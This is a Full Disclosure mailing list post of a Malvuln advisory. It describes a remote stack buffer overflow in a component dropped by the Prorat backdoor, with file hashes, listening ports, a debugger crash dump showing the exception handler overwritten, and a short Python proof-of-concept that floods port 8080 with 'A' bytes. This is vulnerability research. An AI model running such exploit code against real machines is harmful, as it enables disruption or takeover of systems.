---
title: Backdoor.Win32.Prorat.jz / Remote Stack Buffer Overflow (SEH)
url: https://seclists.org/fulldisclosure/2024/Sep/57
source: Full Disclosure
date: 2024-09-30
fetch_date: 2025-10-06T18:25:53.626967
---

# Backdoor.Win32.Prorat.jz / Remote Stack Buffer Overflow (SEH)

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](56)
[By Date](date.html#57)
[![Next](/images/right-icon-16x16.png)](58)

[![Previous](/images/left-icon-16x16.png)](56)
[By Thread](index.html#57)
[![Next](/images/right-icon-16x16.png)](58)

![](/shared/images/nst-icons.svg#search)

# Backdoor.Win32.Prorat.jz / Remote Stack Buffer Overflow (SEH)

---

*From*: malvuln <malvuln13 () gmail com>
*Date*: Fri, 27 Sep 2024 16:21:49 -0400

---

```
Discovery / credits: Malvuln (John Page aka hyp3rlinx) (c) 2024
Original source:
https://malvuln.com/advisory/277f9a4db328476300c4da5f680902ea.txt
Contact: malvuln13 () gmail com
Media: x.com/malvuln

Threat: Backdoor.Win32.Prorat.jz
Vulnerability: Remote Stack Buffer Overflow (SEH)
Description: The RAT listens on TCP ports 51100,5112,5110 and runs an
FTP service. Prorat uses a vulnerable component in a secondary malware
it drops on the victim system named "Netbot_Attacker VIP 6.0 Version
korea.exe" MD5: 2168a606464c7fd016c260140a62815e. The dropped malware
listens on TCP port 8080 and 80 on subsequent restarts. Third-party
attackers who can reach an infected machine can send specially crafted
sequential packetz to port 8080. This will trigger a stack buffer
overflow overwriting the ECX, EIP registers and Structured Exception
Handler (SEH).
Family: Prorat
Type: PE32
MD5: 277f9a4db328476300c4da5f680902ea
SHA256: 1134dffe52ea01f0d93a6889edd36620dbe9ee04224ad662e4f5463c4feb98a7
Vuln ID: MVID-2024-0699
Dropped files:  ~imsinst.exe, NetBot.ini  in  \AppData\Local\Temp directory.
ASLR: False
DEP: False
CFG: False
Safe SEH: False
Disclosure: 09/27/2024

Memory Dump:
(1974.354): Stack buffer overflow - code c0000409 (first/second chance
not available)
eax=00000000 ebx=00000000 ecx=41414141 edx=00000000 esi=00000000 edi=00000002
eip=76fced3c esp=0703f8d0 ebp=0703f910 iopl=0         nv up ei pl nz ac po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000212
ntdll!ZwWaitForMultipleObjects+0xc:
76fced3c c21400          ret     14h

0:008> .ecxr
eax=00000000 ebx=04367000 ecx=41414141 edx=00000000 esi=04367000 edi=00406120
eip=41414141 esp=0703ff80 ebp=0703ff94 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
41414141 ??              ???

0:008> !analyze -v
*******************************************************************************
*                                                                             *
*                        Exception Analysis                                   *
*                                                                             *
*******************************************************************************

*** WARNING: Unable to verify checksum for Netbot_Attacker VIP 6.0
Version korea.exe
*** ERROR: Module load completed but symbols could not be loaded for
Netbot_Attacker VIP 6.0 Version korea.exe

FAULTING_IP:
+2f
41414141 ??              ???

EXCEPTION_RECORD:  0703fad0 -- (.exr 0x703fad0)
ExceptionAddress: 41414141
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000008
NumberParameters: 2
   Parameter[0]: 00000000
   Parameter[1]: 41414141
Attempt to read from address 41414141

PROCESS_NAME:  Netbot_Attacker VIP 6.0 Version korea.exe

ERROR_CODE: (NTSTATUS) 0xc0000409 - The system detected an overrun of
a stack-based buffer in this application. This overrun could
potentially allow a malicious user to gain control of this
application.

EXCEPTION_CODE: (NTSTATUS) 0xc0000409 - The system detected an overrun
of a stack-based buffer in this application. This overrun could
potentially allow a malicious user to gain control of this
application.

EXCEPTION_PARAMETER1:  00000015

MOD_LIST: <ANALYSIS/>

NTGLOBALFLAG:  0

APPLICATION_VERIFIER_FLAGS:  0

FAILED_INSTRUCTION_ADDRESS:
+2f
41414141 ??              ???

CONTEXT:  0703fb20 -- (.cxr 0x703fb20)
eax=00000000 ebx=04367000 ecx=41414141 edx=00000000 esi=04367000 edi=00406120
eip=41414141 esp=0703ff80 ebp=0703ff94 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
41414141 ??              ???
Resetting default scope

READ_ADDRESS:  41414141

FOLLOWUP_IP:
+2f
41414141 ??              ???

ADDITIONAL_DEBUG_TEXT:  Followup set based on attribute
[Is_ChosenCrashFollowupThread] from Frame:[0] on
thread:[PSEUDO_THREAD]

LAST_CONTROL_TRANSFER:  from 41414141 to 41414141

FAULTING_THREAD:  ffffffff

BUGCHECK_STR:  APPLICATION_FAULT_STACK_BUFFER_OVERRUN_MISSING_GSFRAME_EXPLOITABLE_FILL_PATTERN_41414141_STACKIMMUNE

PRIMARY_PROBLEM_CLASS:  STACK_BUFFER_OVERRUN

DEFAULT_BUCKET_ID:  STACK_BUFFER_OVERRUN

IP_ON_HEAP:  41414141
The fault address in not in any loaded module, please check your build's rebase
log at <releasedir>\bin\build_logs\timebuild\ntrebase.log for module which may
contain the address if it were loaded.

IP_IN_FREE_BLOCK: 41414141

FRAME_ONE_INVALID: 1

STACK_TEXT:
00000000 00000000 unknown!netbot_attacker_vip_6.0_version_korea.exe+0x0

STACK_COMMAND:  .cxr 000000000703FB20 ; kb ; ** Pseudo Context ** ; kb

SYMBOL_NAME:  unknown!netbot_attacker_vip_6.0_version_korea.exe

FOLLOWUP_NAME:  MachineOwner

MODULE_NAME: unknown

IMAGE_NAME:  unknown

DEBUG_FLR_IMAGE_TIMESTAMP:  0

FAILURE_BUCKET_ID:  STACK_BUFFER_OVERRUN_c0000409_unknown!Unloaded

BUCKET_ID:
APPLICATION_FAULT_STACK_BUFFER_OVERRUN_MISSING_GSFRAME_EXPLOITABLE_FILL_PATTERN_41414141_STACKIMMUNE_MISSING_GSFRAME_BAD_IP_unknown!netbot_attacker_vip_6.0_version_korea.exe

Followup: MachineOwner
---------

0:008> !exchain
0703f988: ntdll!_except_handler4+0 (76fd6a50)
  CRT scope  0, func:   ntdll!RtlReportExceptionHelper+251 (770157ad)
Invalid exception stack at 41414141

Exploit/PoC:
from socket import *
import time

MALWARE_HOST="x.x.x.x"
PORT=8080  #80 after initial restart

def Prorat_BOF():

    print("[+] Backdoor.Win32.Prorat.jz")
    print("[+] Remote Stack Buffer Overflow - SEH")
    print("[+] MD5: 277f9a4db328476300c4da5f680902ea")

    for i in range(1, 13):
        s=socket(AF_INET, SOCK_STREAM)
        s.connect((MALWARE_HOST, PORT))
        PAYLOAD="A"*100 * i
        s.send(PAYLOAD.encode())
        time.sleep(0.5)
        print(len(PAYLOAD))
        s.close()

if __name__=="__main__":
    Prorat_BOF()
    print("Malvuln")

Disclaimer: The information contained within this advisory is supplied
"as-is" with no warranties or guarantees of fitness of use or
otherwise. Permission is hereby granted for the redistribution of this
advisory, provided that it is not altered except by reformatting it,
and that due credit is given. Permission is explicitly given for
insertion in vulnerability databases and similar, provided that due
credit is given to the author. The author is not responsible for any
misuse of the information contained herein and accepts no
responsibility for any damage caused by the use or misuse of this
information. The author prohibits any malicious use of security
related information or exploits by the author or elsewhere. Do not
attempt to download Malware samples. The author of this website takes
no responsibility for any kind of damages occurring from improper
Malware handling or the downloading of ANY Malware mentioned on this
website or elsewhere. All content Copyright (c) Malvuln.com (TM).
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![P...